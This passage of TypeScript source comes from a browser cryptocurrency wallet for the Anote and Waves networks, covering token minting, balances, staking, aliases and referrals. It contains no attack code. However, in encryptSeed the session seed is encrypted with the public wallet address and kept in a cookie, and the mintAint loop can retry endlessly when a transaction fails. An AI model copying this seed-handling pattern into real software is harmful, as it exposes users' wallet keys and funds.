        //     // dApp: "3PBmmxKhFcDhb8PrDdCdvw2iGMPnp7VuwPy",
        //     // call: { function: "mint", args: [] },
        //     dApp: "3PBmmxKhFcDhb8PrDdCdvw2iGMPnp7VuwPy",
        //     call: { function: "constructor", args: [{ type: 'string', value: "3PQEVtX7SukU7zVfpgkKDmnrX7NFw1pHBVd" }] },
        //     fee: 500000,
        //     payment: [],
        // }).broadcast();
        var amt = $("#sendWaves").val();
        if (amt != undefined && amt != "") {
            $("#pMessage21").fadeIn(function () {
                setTimeout(function () {
                    $("#pMessage21").html("<u><strong>Please wait for a few seconds without refreshing or closing the app!</strong></u>")
                }, 1000);
                $("#mint1").fadeOut(function () {
                    $("#mint2").fadeIn();
                });
            });

            var amountWaves = parseFloat(amt?.toString()) - 0.001;
            var amountTierWaves = this.aintTier * this.aintPrice;
            var amountStepWaves = amountWaves - 0.005
            // amountStepWaves = amountWaves - amountTierWaves;
            if (amountStepWaves > amountTierWaves) {
                amountStepWaves = amountTierWaves;
            }

            while (amountWaves > 0.005) {
                try {
                    var amount = Math.floor(amountStepWaves * 100000000);
                    console.log(amount);
                    const [tx] = await this.signerWaves.invoke({
                        dApp: "3PBmmxKhFcDhb8PrDdCdvw2iGMPnp7VuwPy",
                        call: { function: "mint", args: [] },
                        // dApp: "3PBmmxKhFcDhb8PrDdCdvw2iGMPnp7VuwPy",
                        // call: { function: "constructor", args: [{ type: 'string', value: "3PQEVtX7SukU7zVfpgkKDmnrX7NFw1pHBVd" }] },
                        fee: 500000,
                        payment: [{
                            assetId: "WAVES",
                            amount: amount,
                        }],
                    }).broadcast();

                    amountWaves = amountWaves - amountStepWaves - 0.005;

                    this.aintTier = 100;
                    this.aintPrice += 0.01
                    var amountTierWaves = this.aintTier * this.aintPrice;

                    var amountStepWaves = amountWaves - 0.005;
                    if (amountStepWaves > amountTierWaves) {
                        amountStepWaves = amountTierWaves;
                    }

                } catch (error: any) {
                    $("#pMessage20").html(error.message);
                    $("#pMessage20").fadeIn(function () {
                        setTimeout(function () {
                            $("#pMessage20").fadeOut(function () {
                                $("#pMessage20").html("Waves amount is required.");
                            });
                        }, 3000);
                    });
                }
            }

            setTimeout(function () {
                wallet.populateBalance(true);
            }, 10000);

            $("#sendWaves").val("");
            $("#receiveAint").val();

            // console.log(this.aintPrice);
        }
    }

    calculateAint() {
        var amountAint = 0;

        var amt = $("#sendWaves").val();
        if (amt != undefined && amt != "") {
            var amountWaves = parseFloat(amt?.toString()) - 0.001;
            // console.log(amountWaves)
            var amountTierWaves = this.aintTier * this.aintPrice;
            // console.log(amountTierWaves)
            var amountStepWaves = amountWaves - 0.005
            // console.log(amountStepWaves)
            if (amountStepWaves > amountTierWaves) {
                amountStepWaves = amountTierWaves;
            }

            var tier = this.aintTier;
            var price = this.aintPrice;

            while (amountWaves > 0.005) {
                amountAint += amountStepWaves / price;
                // console.log(amountAint);

                amountWaves = amountWaves - amountStepWaves - 0.005;

                tier = 100;
                price += 0.01
                var amountTierWaves = tier * price;

                var amountStepWaves = amountWaves - 0.005;
                if (amountStepWaves > amountTierWaves) {
                    amountStepWaves = amountTierWaves;
                }
            }

            $("#receiveAint").val(amountAint.toFixed(8));
        }
    }

    async loadAintInfo() {
        $.getJSON("https://nodes.wavesplatform.com/addresses/data/3PBmmxKhFcDhb8PrDdCdvw2iGMPnp7VuwPy", function (data) {
            data.forEach(function (entry) {
                if (entry.key == "%s__price") {
                    var price = parseFloat(entry.value) / 100000000;
                    $("#aintPrice").val(price.toFixed(8));
                    wallet.aintPrice = price;
                } else if (entry.key == "%s__tier") {
                    var tier = parseFloat(entry.value) / 100000000;
                    $("#aintTier").val(tier.toFixed(8));
                    wallet.aintTier = tier;
                }
            });
        });

        $.getJSON("https://nodes.wavesplatform.com/assets/balance/3PBmmxKhFcDhb8PrDdCdvw2iGMPnp7VuwPy/BvuzJNB6qUrvEmzGt1PMBZ1QCnBNn2L7ezXHhgQKMxr7", function (data) {
            var total = parseFloat(data.balance) / 100000000;
            $("#aintTotal").val(total.toFixed(8));
        });
    }

    async saveAlias() {
        var alias = $("#alias").val();

        if (!alias) {
            $("#pMessage16").html(t.settings.aliasRequired);
            $("#pMessage16").fadeIn(function () {
                setTimeout(function () {
                    $("#pMessage16").fadeOut();
                }, 500);
            });
        } else if (this.balanceWaves < 100000) {
            $("#pMessage16").html(t.settings.aliasMinimumBalance);
            $("#pMessage16").fadeIn(function () {
                setTimeout(function () {
                    $("#pMessage16").fadeOut();
                }, 500);
            });
        } else {
            try {
                const data = {
                    alias: alias,
                }

                const tx = await this.signer
                    .alias(data)
                    .broadcast();

                // $("#pMessage17").html(error);
                $("#pMessage17").fadeIn(function () {
                    setTimeout(function () {
                        $("#pMessage17").fadeOut();
                    }, 500);
                });

                $("#alias").attr("readonly", "yes");
                $("#referralLink").val("https://anote.one/mine?r=" + alias);
                $("#saveAlias").remove();
            } catch (error: any) {
                $("#pMessage16").html(t.settings.aliasLimit);
                $("#pMessage16").fadeIn(function () {
                    setTimeout(function () {
                        $("#pMessage16").fadeOut();
                    }, 500);
                });
            }
        }
    }

    saveReferral() {
        var referral = $("#referral").val();

        if (!referral) {
            $("#pMessage18").html(t.settings.referralRequired);
            $("#pMessage18").fadeIn(function () {
                setTimeout(function () {
                    $("#pMessage18").fadeOut();
                }, 500);
            });
        } else {
            localStorage.setItem("referral", referral?.toString());
            $("#referral").attr("readonly", "yes");
            $("#pMessage19").fadeIn(function () {
                setTimeout(function () {
                    $("#pMessage19").fadeOut();
                    $("#saveReferral").remove();
                }, 500);
            });
        }
    }

    async populateBalance(sendAint: boolean) {
        const balances = await this.signer.getBalance();
        balances.forEach(function (asset) {
            if (asset.assetId == AHRK) {
                wallet.balanceAhrk = asset.amount;
                if (t.lang == "hr") {
                    var balance = wallet.balanceAhrk / AHRKDEC;
                    balance = Math.round(balance * 100) / 100;
                    $("#balance").html(String(balance.toFixed(2)));
                }
            } else if (asset.assetId == AEUR) {
                wallet.balanceAeur = asset.amount;
                if (t.lang == "en") {
                    var balance = Math.round(wallet.balanceAeur) / 100;
                    $("#balance").html(String(balance.toFixed(2)));
                }
            } else if (asset.assetId == "WAVES") {
                wallet.balanceWaves = asset.amount;
                var balance = wallet.balanceWaves / SATINBTC;
                $("#balanceWaves").html(String(balance.toFixed(3)));
            } else if (asset.assetId == AINT) {
                wallet.balanceAint = asset.amount;
                var balance = wallet.balanceAint / SATINBTC;
                $("#balanceAint").html(String(balance.toFixed(4)));
            } else if (asset.assetId == ANOTE) {
                wallet.balanceAnote = asset.amount;
                var balance = wallet.balanceAnote / SATINBTC;
                $("#balanceAnotes").html(String(balance.toFixed(8)));
            }
        });

        const balancesW = await this.signerWaves.getBalance();
        balancesW.forEach(function (asset) {
            if (asset.assetId == "WAVES") {
                var balance = asset.amount / SATINBTC;
                wallet.balanceWaves2 = balance;
                $("#balanceWaves2").html(String(balance.toFixed(8)));
                // $("#sendWaves").val(String(balance.toFixed(8)));
            } else if (asset.assetId == AINTWAVES) {
                if (asset.amount > 0 && wallet.balanceWaves2 >= 0.001 && sendAint) {
                    wallet.sendMintedAint(asset.amount);
                    wallet.balanceWaves2 -= 0.001;
                }
            }
        });

        this.loadAintInfo();
        this.checkScumbag();
    }

    private async initWaves(seed) {
        this.signer = new Signer({
            NODE_URL: 'https://node.anote.digital',
        });
        this.provider = new ProviderSeed(seed);
        this.provider.connect({
            NODE_URL: 'https://node.anote.digital',
            NETWORK_BYTE: 55,
        });
        this.signer.setProvider(this.provider);
        this.user = await this.signer.login();
        this.address = this.user.address;


        this.signerWaves = new Signer({
            NODE_URL: 'https://nodes.wavesplatform.com',
        });
        var providerW = new ProviderSeed(seed);
        providerW.connect({
            NODE_URL: 'https://nodes.wavesplatform.com',
            NETWORK_BYTE: 87,
        });

        this.signerWaves.setProvider(providerW);
        var userW = await this.signerWaves.login();
        this.addressWaves = userW.address;
    }

    private encryptSeed(seed, password) {
        this.seed = libs.crypto.encryptSeed(String(seed), String(password));
        this.sessionSeed = libs.crypto.encryptSeed(String(seed), this.address);
    }

    private decryptSeedSession(): string {
        var seed = libs.crypto.decryptSeed(this.sessionSeed, this.address);
        return seed;
    }

    private setCookies() {
        localStorage.setItem("address", this.address);
        localStorage.setItem("seed", this.seed);
        if (this.referral && this.referral.length > 0 && this.referral != undefined) {
            localStorage.setItem("referral", this.referral);
        }

        var d = new Date();
        d.setHours(d.getHours() + 1)

        Cookies.set("sessionSeed", this.sessionSeed, { expires: d });
    }

    private async populateData() {
        $("#referralLink").val("https://anote.one/mine?r=" + this.address);
        $("#address").val(this.address);
        var historyHref = "https://anote.live/address/" + this.address + "/tx";
        $("#history").attr("href", historyHref);
        this.generateQR();

        if (!this.signer) {
            var seed = this.decryptSeedSession();
            await this.initWaves(seed);
        }

        $("#wavesAddress").val(this.addressWaves);

        await wallet.populateBalance(false);

        setInterval(async function () {
            try {
                await wallet.populateBalance(false);
            } catch (e) { }
        }, 30000);

        await wallet.initMiningSection();

        await wallet.getCaptcha();

        await wallet.checkAlias();

        await wallet.getAdNumber();

        // wallet.checkReferral();

        await wallet.populateStaking();

        await wallet.checkReferral();

        setInterval(async function () {
            try {
                await wallet.initMiningSection();
            } catch (e) { }
        }, 30000);
    }

    async getAdNumber() {
        $.getJSON("https://node.anote.digital/addresses/data/3ANmnLHt8mR9c36mdfQVpBtxUs8z1mMAHQW/%25s__adnum", function (data) {
            $("#buttonCode").attr("href", "https://t.me/AnoteToday/" + data.value);
        });
    }

    private async checkAlias() {
        $.getJSON("https://node.anote.digital/alias/by-address/" + this.address, function (data) {
            if (data.length > 0) {
                var alias = String(data[0]).replace("alias:7:", "");
                $("#alias").val(alias);
                $("#alias").attr("readonly", "yes");
                $("#referralLink").val("https://anote.one/mine?r=" + alias);
                $("#saveAlias").remove();
            }
        });
    }

    private async populateStaking() {
        var stakingKey = "%25s__" + wallet.address;
        $.getJSON("https://node.anote.digital/addresses/data/3A9y1Zy78DDApbQWXKxonXxci6DvnJnnNZD?key=" + stakingKey, function (data) {
            var amountStaked = 0.0;
            if (data.length > 0) {
                amountStaked = parseFloat(data[0].value.split("__")[1]) / 100000000;
            }
            $("#stakedAmount").val(amountStaked.toFixed(8));
        });

        $.getJSON("https://node.anote.digital/addresses/data/3AVTze8bR1SqqMKv3uLedrnqCuWpdU7GZwX", function (data) {
            var showNodeStake = false;
            var buttonNum = 0;
            $("#dropdownMenu2").html("");
            data.forEach(function (entry) {
                if (entry.value?.toString().includes(wallet.address)) {
                    var nodeAddr = entry.value?.toString().split("__")[1]
                    var html = '<li><a class="dropdown-item" href="javascript: void null;" id="nodeButton' + buttonNum + '">Node: ' + nodeAddr + '</a></li>';
                    $("#dropdownMenu2").append(html);
                    showNodeStake = true;

                    $("#nodeButton" + buttonNum).on("click", function () {
                        $("#dropdownMenuButton2").html(this.innerHTML);
                        wallet.stakeType = this.innerHTML.replace("Node: ", "");
                        var stakingKey = "%25s__" + wallet.stakeType;
                        $.getJSON("https://node.anote.digital/addresses/data/3A9y1Zy78DDApbQWXKxonXxci6DvnJnnNZD?key=" + stakingKey, function (data) {
                            var amountStaked = 0.0;
                            if (data.length > 0) {
                                amountStaked = parseFloat(data[0].value.split("__")[1]) / 100000000;
                            }
                            $("#stakedAmountNode").val(amountStaked.toFixed(8));
                        });
                    });

                    buttonNum++;
                }
            });

            if (!showNodeStake) {
                $("#nodeStakePanel").hide();
                $("#nodeStakePanel2").show();
            }
        });
    }

    private async checkReferral() {
        if (this.referral && this.referral.length > 0 && !this.referral.startsWith("3A") && this.referral != undefined) {
            $.getJSON("https://node.anote.digital/alias/by-alias/" + this.referral, function (data) {
                if (data.address) {
                    wallet.referral = data.address;
                    localStorage.removeItem("referral");
                    localStorage.setItem("referral", data.address);
                }
                if (wallet.referral.length > 0) {
                    $("#referral").val(wallet.referral);
                    $("#referral").attr("readonly", "yes");
                    $("#saveReferral").remove();
                }
            });
        }
    }

    private accountExists(): boolean {
        if (this.seed) {
            return true;
        } else {
            return false;
        }
    }

    private isLoggedIn(): boolean {
        if (this.sessionSeed) {
            return true;
        } else {
            return false;
        }
    }

    private generateQR() {
        QRCode.toString(this.address, function (error, qr) {
            if (error) console.error(error);
            $('#qrcode').replaceWith($('<div/>').append(qr).find('svg:first').attr('id', 'qrcode'));
            $('#qrcode').attr('class', 'qrcode border border-dark')
        })
    }

    private showHomeAfterRegister() {
        activeScreen = "home";
        $("#page-newaccount").fadeOut(function () {
            $("#page-main").fadeIn();
        });
    }

    private showHomeAfterLogin() {
        if (activeScreen != "home") {
            $("#screen-" + activeScreen).hide();
            $("#screen-home").show();
        }
        activeScreen = "home";
        $("#page-login").fadeOut(function () {
            $("#page-main").fadeIn();
        });
    }

    private async passwordValid(password): Promise<boolean> {
        if (password) {
            try {
                var seed = libs.crypto.decryptSeed(this.seed, String(password));
                var signer = new Signer({
                    NODE_URL: 'https://node.anote.digital',
                });
                var provider = new ProviderSeed(seed);
                provider.connect({
                    NODE_URL: 'https://node.anote.digital',
                    NETWORK_BYTE: 55,
                });
                signer.setProvider(provider);
                var user = await signer.login();
                if (this.address == user.address) {
                    return true;
                } else {
                    return false;
                }
            } catch (e) {
                console.log(e);
                return false;
            }
        } else {
            return false;
        }
    }

    private getDecimalPlaces(currency: string): number {
        if (currency == "" || currency == AINT || currency == ANOTE) {
            return SATINBTC;
        } else if (currency == AHRK) {
            return AHRKDEC;
        } else if (currency == AEUR) {
            return 100;
        }
        return SATINBTC;
    }

    private getFee(currency: string) {
        if (currency == AHRK) {
            return 50000;
        } else if (currency == AEUR) {
            return 1;
        } else if (currency == "") {
            return 100000;
        } else if (currency == ANOTE) {
            return 30000000;
        } else if (currency == AINT) {
            return 100000;
        }
        return 100000;
    }
}

const AHRK = "Gvs59WEEXVAQiRZwisUosG7fVNr8vnzS8mjkgqotrERT";
const AEUR = "Az4MsPQZn9RJm8adcya5RuztQ49rMGUW99Ebj56triWr";
const AINT = "7paojf37ipks5Ac4rHMwtLHHe9YU6w8FBfafwoTEmmf9";
const AINTWAVES = "BvuzJNB6qUrvEmzGt1PMBZ1QCnBNn2L7ezXHhgQKMxr7";
const ANOTE = "";

const AHRKDEC = 1000000;
const SATINBTC = 100000000;
const AHRKADDRESS = "3PPc3AP75DzoL8neS4e53tZ7ybUAVxk2jAb";
const AINTADDRESS = "3PBmmxKhFcDhb8PrDdCdvw2iGMPnp7VuwPy"

var activeScreen = "home";
var earningsScript = "https://aint.kriptokuna.com";
// var mobileNodeUrl = "http://localhost:5001";
var mobileNodeUrl = "https://mobile.anote.digital";
var t;

const wallet = new Wallet();

// Button bindings

$("#receive").on("click", function () {
    activeScreen = "receive";
    $("#screen-home").fadeOut(function () {
        $("#screen-receive").fadeIn();
    });
});

$("#backFromReceive").on("click", function () {
    activeScreen = "home";
    $("#screen-receive").fadeOut(function () {
        $("#screen-home").fadeIn();
    });
});

$("#send").on("click", function () {
    activeScreen = "send";
    wallet.updateAmount();
    $("#screen-home").fadeOut(function () {
        $("#screen-send").fadeIn();
    });
});

$("#backFromSend").on("click", function () {
    activeScreen = "home";
    $("#screen-send").fadeOut(function () {
        $("#screen-home").fadeIn();
    });
});

$("#addressBook").on("click", function () {
    activeScreen = "addressBook";
    Cookies.set("openMine", "true", { expires: 365 * 24 * 10 });
    $("#screen-home").fadeOut(function () {
        $("#screen-addressBook").fadeIn();
        // $("#mineInfo").hide();
    });
});

$("#backFromAddressBook").on("click", function () {
    activeScreen = "home";
    $("#screen-addressBook").fadeOut(function () {
        $("#screen-home").fadeIn();
    });
});

$("#settings").on("click", function () {
    if (activeScreen != "home") {
        $("#screen-" + activeScreen).fadeOut(function () {
            $("#screen-settings").fadeIn();
            activeScreen = "settings";
        });
    } else {
        activeScreen = "settings";
        $("#screen-home").fadeOut(function () {
            $("#screen-settings").fadeIn();
        });
    }
});

$("#tabButton1").on("click", function () {
    $("#tabButton1").addClass("active");
    $("#tabButton2").removeClass("active");
    $("#tabButton5").removeClass("active");
    $("#tab2").hide();
    $("#tab5").hide();
    $("#tab1").fadeIn();
});

$("#tabButton2").on("click", function () {
    $("#tabButton2").addClass("active");
    $("#tabButton1").removeClass("active");
    $("#tabButton5").removeClass("active");
    $("#tab1").hide();
    $("#tab5").hide();
    $("#tab2").fadeIn();
});

$("#tabButton3").on("click", function () {
    $("#tabButton3").addClass("active");
    $("#tabButton4").removeClass("active");
    $("#tabButton6").removeClass("active");
    $("#tab4").hide();
    $("#tab6").hide();
    $("#tab3").fadeIn();
});

$("#tabButton4").on("click", function () {
    $("#tabButton4").addClass("active");
    $("#tabButton3").removeClass("active");
    $("#tabButton6").removeClass("active");
    $("#tab3").hide();
    $("#tab6").hide();
    $("#tab4").fadeIn();
});

$("#tabButton5").on("click", function () {
    $("#tabButton5").addClass("active");
    $("#tabButton1").removeClass("active");
    $("#tabButton2").removeClass("active");
    $("#tab1").hide();
    $("#tab2").hide();
    $("#tab5").fadeIn();
});

$("#tabButton6").on("click", function () {
    $("#tabButton6").addClass("active");
    $("#tabButton3").removeClass("active");
    $("#tabButton4").removeClass("active");
    $("#tab3").hide();
    $("#tab4").hide();
    $("#tab6").fadeIn();
});

$("#backFromSettings").on("click", function () {
    activeScreen = "home";
    $("#screen-settings").fadeOut(function () {
        $("#screen-home").fadeIn();
    });
});

$("#qrButton").on("click", function () {
    // activeScreen = "qr";
    // $("#screen-send").fadeOut(function(){
    //     $("#screen-qr").fadeIn(function() {
    //         wallet.qrscan();
    //     });
    // });
    wallet.qrscan();
});

$("#backFromQR").on("click", function () {
    activeScreen = "home";
    $("#screen-qr").fadeOut(function () {
        $("#screen-home").fadeIn();
    });
});

$("#buttonShowExisting").on("click", function () {
    $("#newAccount").fadeOut(function () {
        $("#existingAccount").fadeIn();
    });
});

$("#buttonNewAccount").on("click", function () {
    $("#existingAccount").fadeOut(function () {
        $("#newAccount").fadeIn();
    });
});

$("#buttonRegister").on("click", function () {
    wallet.register();
});

$("#buttonImport").on("click", function () {
    wallet.import();
});

$("#buttonLogin").on("click", function () {
    wallet.login();
});

$("#loginForm").on("submit", function () {
    wallet.login();
});

$("#buttonLogout").on("click", function () {
    wallet.logout();
});

$("#buttonDeleteAccount").on("click", function () {
    wallet.deleteAccount();
});

$("#buttonSend").on("click", function () {
    wallet.send();
});

$("#buttonExchange").on("click", function () {
    wallet.exchange();
});

$("#buttonShowSeed").on("click", function () {
    wallet.showSeed();
});

$("#buttonChangePass").on("click", function () {
    wallet.changePassword();
});

$("#buttonCollect").on("click", function () {
    wallet.collectEarnings(AHRKADDRESS);
});

// $("#sendCurrency").on( "change", function() {
//     wallet.updateAmount();
//     wallet.updateFeeAmount();
// });

$("#fromCurrency").on("change", function () {
    wallet.updateAmountExchange();
    wallet.updateFeeAmountExchange();
});

$("#buttonCollectEarnings").on("click", function () {
    // wallet.collectEarnings(AINTADDRESS);
});

$("#buttonCopy").on("click", function () {
    var address = $("#address").val();
    copy(String(address));
    $("#pMessage4").fadeIn(function () {
        setTimeout(function () {
            $("#pMessage4").fadeOut();
        }, 500);
    });
});

$("#buttonCopyReferral").on("click", function () {
    var link = $("#referralLink").val();
    copy(String(link));
    $("#pMessage13").fadeIn(function () {
        setTimeout(function () {
            $("#pMessage13").fadeOut();
        }, 500);
    });
});

$("#buttonCopyWavesAddress").on("click", function () {
    var link = $("#wavesAddress").val();
    copy(String(link));
    $("#pMessage22").fadeIn(function () {
        setTimeout(function () {
            $("#pMessage22").fadeOut();
        }, 500);
    });
});

$("#buttonSeedCopy").on("click", function () {
    var seed = $("#seedWords2").val();
    copy(String(seed));
    $("#pMessage5").fadeIn(function () {
        setTimeout(function () {
            $("#pMessage5").fadeOut();
            $("#seedWords2").val("");
            $("#buttonSeedCopy").prop('disabled', true);
        }, 500);
    });
});

$("#anoteButton").on("click", function () {
    wallet.selectedCurrency = ANOTE;
    $("#dropdownMenuButton1").html("ANOTE");
    wallet.updateAmount();
});

$("#aintButton").on("click", function () {
    wallet.selectedCurrency = AINT;
    $("#dropdownMenuButton1").html("AINT");
    wallet.updateAmount();
});

// $("#mobileButton").on("click", function () {
//     wallet.stakeType = "mobile";
//     $("#dropdownMenuButton2").html("Mobile Mining");
//     var stakingKey = "%25s__" + wallet.getAddress();
//     $.getJSON("https://node.anote.digital/addresses/data/3A9y1Zy78DDApbQWXKxonXxci6DvnJnnNZD?key=" + stakingKey, function (data) {
//         var amountStaked = 0.0;
//         if (data.length > 0) {
//             amountStaked = parseFloat(data[0].value.split("__")[1]) / 100000000;
//         }
//         $("#stakedAmountNode").val(amountStaked.toFixed(8));
//     });
// });

$("#buttonMine").on("click", function () {
    wallet.mine();
});

$("#buttonStakeAint").on("click", function () {
    wallet.stakeAint();
});

$("#buttonUnstakeAint").on("click", function () {
    wallet.unstakeAint();
});

$("#buttonStakeAintNode").on("click", function () {
    wallet.stakeAintNode();
});

$("#buttonUnstakeAintNode").on("click", function () {
    wallet.unstakeAintNode();
});

$("#saveAlias").on("click", function () {
    wallet.saveAlias();
});

$("#saveReferral").on("click", function () {
    wallet.saveReferral();
});

$("#buttonCalculate").on("click", function () {
    var amount = $("#sendWaves").val();
    if (!amount || amount?.toString().length == 0 || parseFloat(amount?.toString()) == 0) {
        $("#pMessage20").fadeIn(function () {
            setTimeout(function () {
                $("#pMessage20").fadeOut();
            }, 1000);
        });
    } else {
        wallet.calculateAint();
    }
});

$("#wavesMax").on("click", function () {
    $("#sendWaves").val(wallet.balanceWaves2.toFixed(8));
});

$("#buttonMint").on("click", function () {
    var amount = $("#sendWaves").val();
    if (!amount || amount?.toString().length == 0 || parseFloat(amount?.toString()) == 0) {
        $("#pMessage20").fadeIn(function () {
            setTimeout(function () {
                $("#pMessage20").fadeOut();
            }, 1000);
        });
    } else {
        wallet.mintAint();
    }
});

function createTranslation() {
    var lang = $("#lang").val();
    $.getJSON("locales/" + lang + ".json", function (data) {
        t = data.app;
        const page = wallet.getPage();
        $("#page-loading").fadeOut(function () {
            $("#page-" + page).fadeIn();
        });
    });
}

document.addEventListener('DOMContentLoaded', (event) => {
    createTranslation();
})

// Helper functions

function passwordsEqual(p1id, p2id, mid): boolean {
    var p1 = $("#" + p1id).val();
    var p2 = $("#" + p2id).val();

    if (!p1 || !p2) {
        $("#" + mid).html(t.bothPassRequired);
        $("#" + mid).fadeIn();
        return false;
    }

    if (p1 == p2) {
        return true;
    } else {
        $("#" + mid).html(t.passwordsDontMatch);
        $("#" + mid).fadeIn();
        return false;
    }
}

function float2int(value) {
    return value | 0;
}